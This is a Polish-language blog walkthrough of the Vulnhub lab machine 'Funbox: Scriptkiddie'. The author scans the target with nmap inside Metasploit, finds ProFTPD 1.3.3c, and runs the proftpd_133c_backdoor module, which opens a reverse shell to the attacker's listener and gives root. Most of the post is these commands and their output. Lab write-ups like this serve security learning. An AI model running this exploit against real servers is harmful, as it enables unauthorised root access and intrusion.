---
title: "Funbox: Scriptkiddie"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Vulnhub
  - Walkthrough
  - Scriptkiddie
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Funbox: Scriptkiddie
Write-up is in Polish language.

# Metainfo

|:----|:----|
|Nazwa:|Funbox: Scriptkiddie|
|Autor:|[0815R2d2](https://www.vulnhub.com/author/0815r2d2,714/)|
|Wypuszczony:|10.07.2021|
|Do ściągnięcia:|[Stąd](https://www.vulnhub.com/entry/funbox-scriptkiddie,725/) - Vulnhub|
|Poziom:|Łatwy|
|Nauczysz się:|Metasploit, Podstawy|

# Wstęp
[Funbox: Scriptkiddie](https://www.vulnhub.com/entry/funbox-scriptkiddie,725/) jest chyba najłatwiejszą maszyną jaką dane było mi złamać. Jeżeli jesteś początkujący, spróbuj ją przejść bez solucji. To naprawdę jest proste. A jeżeli utknąłeś, to cóż, ten tekst powinien Ci pomóc.
{: .text-justify}
# Zaczynamy
Najpierw użyjemy **Metasploit**a i zaczniemy od standardowego skanowania portów:
{: .text-justify}
<div class="notice--primary" markdown="1">
```console
workspace -a "Funbox: Scriptkiddie"
db_nmap -A -p- 172.16.1.208
services
```
```console
msf6 exploit(multi/script/web_delivery) > workspace -a "Funbox: Scriptkiddie"
[*] Workspace: Funbox: Scriptkiddie
msf6 exploit(multi/script/web_delivery) >
msf6 exploit(multi/script/web_delivery) >
msf6 exploit(multi/script/web_delivery) > hosts

Hosts
=====

address       mac                name      os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----      -------  ---------  -----  -------  ----  --------
172.16.1.208  42:75:a2:28:18:aa  funbox11  Linux               3.X    server

msf6 exploit(multi/script/web_delivery) > db_nmap -A -p- 172.16.1.208
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 19:53 CEST
[*] Nmap: Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
[*] Nmap: Nmap done: 1 IP address (0 hosts up) scanned in 2.21 seconds
msf6 exploit(multi/script/web_delivery) > db_nmap -A -p- 172.16.1.208
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 19:55 CEST
[*] Nmap: Nmap scan report for funbox11 (172.16.1.208)
[*] Nmap: Host is up (0.00037s latency).
[*] Nmap: Not shown: 65527 closed ports
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 21/tcp  open  ftp         ProFTPD 1.3.3c
[*] Nmap: 22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 a6:0e:30:35:3b:ef:43:44:f5:1c:d7:c6:58:64:09:92 (RSA)
[*] Nmap: |   256 c2:d8:bd:62:bf:13:89:28:f8:61:e0:a6:c4:f7:a5:bf (ECDSA)
[*] Nmap: |_  256 12:60:6e:58:ee:f2:bd:9c:ff:b0:35:05:83:08:71:b8 (ED25519)
[*] Nmap: 25/tcp  open  smtp        Postfix smtpd
[*] Nmap: |_smtp-commands: funbox11, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
[*] Nmap: | ssl-cert: Subject: commonName=funbox11
[*] Nmap: | Not valid before: 2021-07-19T16:52:14
[*] Nmap: |_Not valid after:  2031-07-17T16:52:14
[*] Nmap: |_ssl-date: TLS randomness does not represent time
[*] Nmap: 80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
[*] Nmap: |_http-generator: WordPress 5.8
[*] Nmap: |_http-server-header: Apache/2.4.18 (Ubuntu)
[*] Nmap: |_http-title: Funbox: Scriptkiddie
[*] Nmap: 110/tcp open  pop3        Dovecot pop3d
[*] Nmap: |_pop3-capabilities: TOP RESP-CODES CAPA SASL PIPELINING AUTH-RESP-CODE UIDL
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 143/tcp open  imap        Dovecot imapd
[*] Nmap: |_imap-capabilities: OK LITERAL+ ENABLE LOGIN-REFERRALS more capabilities LOGINDISABLEDA0001 have ID Pre-login post-login SASL-IR IDLE listed IMAP4rev1
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 42:75:A2:28:18:AA (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 3.X|4.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
[*] Nmap: OS details: Linux 3.2 - 4.9
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: Host:  funbox11; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Host script results:
[*] Nmap: |_clock-skew: mean: -39m50s, deviation: 1h09m16s, median: 9s
[*] Nmap: |_nbstat: NetBIOS name: FUNBOX11, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
[*] Nmap: | smb-os-discovery:
[*] Nmap: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] Nmap: |   Computer name: funbox11
[*] Nmap: |   NetBIOS computer name: FUNBOX11\x00
[*] Nmap: |   Domain name: \x00
[*] Nmap: |   FQDN: funbox11
[*] Nmap: |_  System time: 2021-09-02T19:55:47+02:00
[*] Nmap: | smb-security-mode:
[*] Nmap: |   account_used: guest
[*] Nmap: |   authentication_level: user
[*] Nmap: |   challenge_response: supported
[*] Nmap: |_  message_signing: disabled (dangerous, but default)
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   2.02:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2021-09-02T17:55:47
[*] Nmap: |_  start_date: N/A
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.37 ms funbox11 (172.16.1.208)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.03 seconds
msf6 exploit(multi/script/web_delivery) > services
Services
========

host          port  proto  name         state  info
----          ----  -----  ----         -----  ----
172.16.1.208  21    tcp    ftp          open   ProFTPD 1.3.3c
172.16.1.208  22    tcp    ssh          open   OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 Ubuntu Linux; protocol 2.0
172.16.1.208  25    tcp    smtp         open   Postfix smtpd
172.16.1.208  80    tcp    http         open   Apache httpd 2.4.18 (Ubuntu)
172.16.1.208  110   tcp    pop3         open   Dovecot pop3d
172.16.1.208  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
172.16.1.208  143   tcp    imap         open   Dovecot imapd
172.16.1.208  445   tcp    netbios-ssn  open   Samba smbd 4.3.11-Ubuntu workgroup: WORKGROUP

msf6 exploit(multi/script/web_delivery) >
```
</div>
W usługach widzimy na początku **ProFTPD 1.3.3c**. Sprawdźmy, czy coś na niego mamy? :smiley:
{: .text-justify}
```console
msf6 exploit(multi/script/web_delivery) > search ProFTPD 1.3.3c

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_133c_backdoor
```
Jak widać, jest **backdoor**.
<div class="notice--primary" markdown="1">
```console
use unix/ftp/proftpd_133c_backdoor
set rhosts 172.16.1.208
set lhost eth0
```
```console
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP double handler on 172.16.1.10:4444
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > [*] 172.16.1.208:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Wt94AwoZmyiN1F7w;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "Wt94AwoZmyiN1F7w\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (172.16.1.10:4444 -> 172.16.1.208:50522) at 2021-09-02 20:08:09 +0200

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               172.16.1.10:4444 -> 172.16.1.208:50522 (172.16.1.208)

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions 1
[*] Starting interaction with 1...

id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

```
</div>
# Kończymy
Komentarz jest zbędny. Patrzyłem, też inne usługi, ale nie mogłem nic na nie znaleźć. :smiley:
{: .text-justify}